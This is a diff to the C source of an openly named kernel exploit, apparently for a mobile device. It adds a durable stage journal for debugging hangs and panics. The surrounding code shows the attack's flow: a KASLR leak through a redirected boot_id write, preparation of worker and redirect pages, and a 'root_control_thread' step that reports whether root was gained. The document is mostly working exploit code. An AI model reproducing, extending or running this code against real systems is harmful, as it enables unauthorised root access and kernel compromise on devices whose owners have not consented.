@@ -50,6 +50,30 @@ static struct songyuan_page_result redirect_pages[8];
 static size_t redirect_page_count;
 static size_t redirect_page_next;
 
+/* stdout is returned to the app only after the payload exits. A hard reset
+ * therefore loses the one piece of evidence needed to locate a hang. Keep a
+ * tiny opt-in journal and fsync every marker so it survives a kernel stall. */
+static void durable_stage(const char *stage) {
+  const char *path = getenv("TICKERBAR_STAGE_LOG");
+  if (!path || !*path || !stage || !*stage)
+    return;
+  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
+  if (fd < 0)
+    return;
+  struct timespec now = {0, 0};
+  clock_gettime(CLOCK_REALTIME, &now);
+  char line[192];
+  int len = snprintf(line, sizeof(line), "%lld.%03ld pid=%d %s\n",
+                     (long long)now.tv_sec, now.tv_nsec / 1000000L,
+                     getpid(), stage);
+  if (len > 0) {
+    size_t count = (size_t)len < sizeof(line) ? (size_t)len : sizeof(line) - 1;
+    (void)write(fd, line, count);
+    (void)fsync(fd);
+  }
+  close(fd);
+}
+
 struct leader_proof_shared {
   atomic_int task_ready;
   atomic_uintptr_t task;
@@ -469,8 +493,11 @@ static int leak_kaslr(void) {
   /* The primary erase also stores bootid_data at logger_slot+8.  That
    * adjacent slot is zero in the exact image; use the parentless secondary
    * erase to restore it before this transaction returns. */
+  durable_stage("kaslr-write-begin");
   int write_ok = kernel_write64_once_shape(bootid_data, logger_slot,
                                            "kaslr", 2);
+  durable_stage(write_ok ? "kaslr-write-returned-ok" :
+                           "kaslr-write-returned-failed");
   memset(words, 0, sizeof(words));
   if (!read_bootid_words(words)) {
     pr_error("songyuan kaslr read invalid write_ok=%d first=%016llx "
@@ -478,8 +505,10 @@ static int leak_kaslr(void) {
              (unsigned long long)words[0], (unsigned long long)words[1]);
   } else if (accept_kaslr_words(
                  words, write_ok ? "write" : "write-side-effect")) {
+    durable_stage("kaslr-readback-valid");
     return 1;
   } else {
+    durable_stage("kaslr-readback-invalid");
     pr_error("songyuan kaslr stage produced no valid pointer write_ok=%d "
              "words=%016llx/%016llx; refusing retry\n",
              write_ok, (unsigned long long)words[0],
@@ -785,6 +814,7 @@ int run_exploit(int argc, char **argv) {
              "TICKERBAR_ROOT_ARMED=1 is required\n");
     return 2;
   }
+  durable_stage("exploit-entered");
   disable_rseq_for_thread();
   set_limit();
   log_startup_context();
@@ -815,15 +845,19 @@ int run_exploit(int argc, char **argv) {
    * copy_process()/dup_fd() traverse corrupted state and panic the kernel.
    * Workers receive their dynamic payload later through private pipes. */
   if (!songyuan_native_workers_prepare(stage_count)) {
+    durable_stage("native-workers-failed");
     pr_error("songyuan refusing to start: native worker setup failed\n");
     return 1;
   }
+  durable_stage("native-workers-ready");
 
   size_t page_worker_count = stage_count + PAGE_WORKER_SPARES;
   if (!songyuan_page_workers_prepare(page_worker_count)) {
+    durable_stage("page-workers-failed");
     pr_error("songyuan refusing to start: page worker setup failed\n");
     return 1;
   }
+  durable_stage("page-workers-ready");
 
   if (getenv("TICKERBAR_WORKER_SELFTEST")) {
     uint64_t test_payload[EXP_BUF_NWORDS] = {0};
@@ -856,13 +890,16 @@ int run_exploit(int argc, char **argv) {
   }
 
   if (!read_boot_id_text(original_boot_id)) {
+    durable_stage("boot-id-text-invalid");
     pr_error("songyuan refusing to start: boot_id is not a valid UUID\n");
     return 1;
   }
   if (!read_bootid_words(original_boot_id_words)) {
+    durable_stage("boot-id-words-invalid");
     pr_error("songyuan refusing to start: cannot decode boot_id words\n");
     return 1;
   }
+  durable_stage("boot-id-baseline-ready");
   pr_success("songyuan-bootid-baseline uuid=%s\n", original_boot_id);
 
   /* Page reclaim is deliberately not run while boot_id.data is redirected:
@@ -874,13 +911,19 @@ int run_exploit(int argc, char **argv) {
    * helpers, eliminating the long stale-page window from the last panic. */
   size_t redirect_count = needs_slide_write ? 2 : 0;
   if (redirect_count && !prepare_redirect_pages(redirect_count)) {
+    durable_stage("redirect-pages-failed");
     pr_error("songyuan redirect-page preparation failed count=%zu\n",
              redirect_count);
     return 1;
   }
+  durable_stage("redirect-pages-ready");
 
-  if (!leak_kaslr())
+  durable_stage("kaslr-stage-begin");
+  if (!leak_kaslr()) {
+    durable_stage("kaslr-stage-failed");
     return 1;
+  }
+  durable_stage("kaslr-stage-ready");
   if (repair_only) {
     uintptr_t init_cred = (uintptr_t)(kaslr_base + INIT_CRED_OFF);
     int restored = !boot_id_needs_restore || restore_boot_id_pointer();
@@ -899,7 +942,9 @@ int run_exploit(int argc, char **argv) {
     return restored ? 0 : 1;
   }
 
+  durable_stage("root-control-begin");
   int rooted = root_control_thread();
+  durable_stage(rooted ? "root-control-ready" : "root-control-failed");
   alarm(0);
   pr_success("songyuan-final rooted=%d uid=%d gid=%d base=%016llx\n",
              rooted, atomic_load(&control_uid), atomic_load(&control_gid),
